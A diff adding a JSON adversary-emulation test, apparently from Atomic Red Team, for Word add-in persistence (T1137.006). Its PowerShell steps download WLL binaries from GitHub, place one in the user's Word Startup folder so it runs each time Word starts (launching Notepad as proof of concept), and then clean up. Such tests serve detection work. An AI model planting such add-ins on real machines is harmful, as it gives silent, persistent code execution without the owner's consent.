@@ -1,0 +1,150 @@
+{
+  "id": "95408a99-4fa7-4cd6-a7ef-cb65f86351cf",
+  "name": "Persistent Code Execution Via Word Add-in File (WLL)",
+  "description": "Creates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194",
+      "type": "execute-command",
+      "data": {
+        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "698ff821-d8cd-4bb7-bb14-893c19fc370e",
+      "type": "execute-command",
+      "data": {
+        "command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "baf09e2c-47b6-4ee9-a077-6dc6765c195c",
+      "name": "Check dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9fdc460a-2f4e-40b2-8679-89f1ac30280f",
+      "name": "Resolve dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "edb3b9bd-427e-42af-9371-5e02308cc47d",
+      "name": "Re-check dependency 1/2",
+      "description": "Microsoft Word must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "099dc87f-f6b0-44bf-b0de-a794d6594cc5",
+      "name": "Check dependency 2/2",
+      "description": "WLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8bbb9af7-8137-4571-88ff-bfd17ea1cdf4",
+      "name": "Resolve dependency 2/2",
+      "description": "WLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\"",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "1c5aa376-2161-44f4-ae3a-ccd75675d14d",
+      "name": "Re-check dependency 2/2",
+      "description": "WLL files must exist on disk at specified location",
+      "type": "execute-command",
+      "data": {
+        "command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194",
+      "p": "on-success",
+      "o": "698ff821-d8cd-4bb7-bb14-893c19fc370e"
+    },
+    {
+      "s": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194",
+      "p": "on-failure",
+      "o": "698ff821-d8cd-4bb7-bb14-893c19fc370e"
+    },
+    {
+      "s": "baf09e2c-47b6-4ee9-a077-6dc6765c195c",
+      "p": "on-success",
+      "o": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194"
+    },
+    {
+      "s": "baf09e2c-47b6-4ee9-a077-6dc6765c195c",
+      "p": "on-failure",
+      "o": "9fdc460a-2f4e-40b2-8679-89f1ac30280f"
+    },
+    {
+      "s": "9fdc460a-2f4e-40b2-8679-89f1ac30280f",
+      "p": "on-success",
+      "o": "edb3b9bd-427e-42af-9371-5e02308cc47d"
+    },
+    {
+      "s": "edb3b9bd-427e-42af-9371-5e02308cc47d",
+      "p": "on-failure",
+      "o": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194"
+    },
+    {
+      "s": "099dc87f-f6b0-44bf-b0de-a794d6594cc5",
+      "p": "on-success",
+      "o": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194"
+    },
+    {
+      "s": "099dc87f-f6b0-44bf-b0de-a794d6594cc5",
+      "p": "on-failure",
+      "o": "8bbb9af7-8137-4571-88ff-bfd17ea1cdf4"
+    },
+    {
+      "s": "8bbb9af7-8137-4571-88ff-bfd17ea1cdf4",
+      "p": "on-success",
+      "o": "1c5aa376-2161-44f4-ae3a-ccd75675d14d"
+    },
+    {
+      "s": "1c5aa376-2161-44f4-ae3a-ccd75675d14d",
+      "p": "on-failure",
+      "o": "53931f1a-2de9-4fc6-acd3-d6e08b0fd194"
+    }
+  ],
+  "tags": [
+    "T1137.006",
+    "atomic-red-team"
+  ]
+}
